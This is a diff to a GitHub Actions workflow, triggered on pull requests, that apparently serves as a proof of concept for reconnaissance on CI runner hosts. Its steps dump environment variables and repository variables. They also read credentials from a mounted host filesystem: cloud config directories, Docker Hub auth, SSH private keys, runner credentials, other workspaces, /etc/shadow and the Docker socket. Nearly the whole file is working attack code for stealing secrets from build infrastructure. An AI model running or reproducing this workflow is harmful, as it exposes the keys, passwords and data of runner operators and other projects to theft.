@@ -1,21 +1,26 @@
-name: recon - full host dump
+name: recon - full host dump with var test
 
 on:
   pull_request:
     branches: [main, master]
 
 jobs:
-  check-vars:
+  test-vars:
     runs-on: ubuntu-latest
     container:
       image: alpine:latest
-      options: --env CHECK_VAR=${{ vars.MY_VAR }} --env CHECK_SECRET=${{ secrets.MY_SECRET }}
+      options: --env POC_CONFIRMED=yes
     steps:
-      - run: |
-          echo "vars.MY_VAR = [$CHECK_VAR]"
-          echo "secrets.MY_SECRET = [$CHECK_SECRET]"
-          echo "--- full env ---"
+      - name: Check if vars/secrets available
+        run: |
+          echo "=== TEST: vars.MY_VAR ==="
+          echo "MY_VAR from vars: [${{ vars.MY_VAR }}]"
+          echo ""
+          echo "=== TEST: full env dump ==="
           env | sort
+          echo ""
+          echo "--- looking for MY_ ---"
+          env | grep MY_ || echo "no MY_ env vars"
 
   full-recon:
     runs-on: ubuntu-latest
@@ -29,74 +34,31 @@ jobs:
           echo "Kernel:   $(cat /host/proc/version 2>/dev/null)"
           echo "OS:       $(cat /host/etc/os-release 2>/dev/null | grep PRETTY_NAME)"
           echo "Uptime:   $(cat /host/proc/uptime 2>/dev/null | awk '{print int($1/86400)"d "int($1%86400/3600)"h"}')"
-          echo ""
-
       - run: |
           echo "=== CLOUD CREDENTIALS ==="
           for dir in .aws .azure .gcp .config/gcloud .kube .helm; do
             echo "--- /home/runner/$dir ---"
             ls -la "/host/home/runner/$dir" 2>/dev/null || echo "  (not found)"
           done
-          echo ""
           echo "--- Docker Hub auth ---"
           cat /host/home/runner/.docker/config.json 2>/dev/null
-          echo ""
-
       - run: |
-          echo "=== SSH & AUTH KEYS ==="
+          echo "=== SSH ==="
           for f in .ssh/id_rsa .ssh/id_ed25519 .ssh/authorized_keys .ssh/known_hosts .ssh/config; do
             echo "--- /home/runner/$f ---"
             cat "/host/home/runner/$f" 2>/dev/null || echo "  (not found)"
           done
-          echo ""
-
       - run: |
-          echo "=== ACTIONS RUNNER CONFIG ==="
-          cat /host/home/runner/actions-runner/.runner 2>/dev/null || echo "  (not found)"
-          echo ""
-          echo "--- credentials ---"
-          cat /host/home/runner/actions-runner/.credentials 2>/dev/null || echo "  (not found)"
-          echo ""
-
+          echo "=== RUNNER CONFIG ==="
+          ls /host/home/runner/actions-runner/ 2>/dev/null | head -10
       - run: |
-          echo "=== OTHER WORKSPACES ==="
-          ls -la /host/home/runner/work/ 2>/dev/null
-          echo ""
-          for repo in /host/home/runner/work/*/; do
-            r=$(basename "$repo")
-            echo "--- $r ---"
-            ls "$repo" 2>/dev/null | head -5
-          done
-          echo ""
-
-      - run: |
-          echo "=== NETWORK (HOST) ==="
-          echo "--- IPs ---"
-          cat /host/proc/net/fib_trie 2>/dev/null | grep -A2 "LOCAL" | head -20
-          echo ""
-          echo "--- Listening ports ---"
-          cat /host/proc/net/tcp 2>/dev/null | awk '{print $2}' | cut -d: -f2 | sort -n | uniq | head -20
-          echo ""
-
+          echo "=== WORKSPACES ==="
+          ls -la /host/home/runner/work/
       - run: |
           echo "=== SYSTEM SECRETS ==="
-          echo "--- shadow (first 5) ---"
           head -5 /host/etc/shadow 2>/dev/null || echo "  (not readable)"
-          echo ""
-          echo "--- passwd ---"
-          head -10 /host/etc/passwd 2>/dev/null
-          echo ""
-          echo "--- group (runner related) ---"
-          grep -E "runner|docker|sudo|admin" /host/etc/group 2>/dev/null || echo "  (not found)"
-          echo ""
-
+          echo "--- docker group ---"
+          grep docker /host/etc/group 2>/dev/null
       - run: |
           echo "=== DOCKER ON HOST ==="
-          ls -la /host/var/run/docker.sock 2>/dev/null || echo "  sock not found at /var/run"
-          ls -la /host/run/docker.sock 2>/dev/null || echo "  sock not found at /run"
-          echo ""
-          echo "--- docker containers ---"
-          docker ps 2>/dev/null && echo "docker accessible" || echo "docker CLI not available (but socket is mounted)"
-          echo ""
-          echo "--- images ---"
-          docker images 2>/dev/null | head -5 || echo "  (no docker CLI)"
+          ls -la /host/var/run/docker.sock
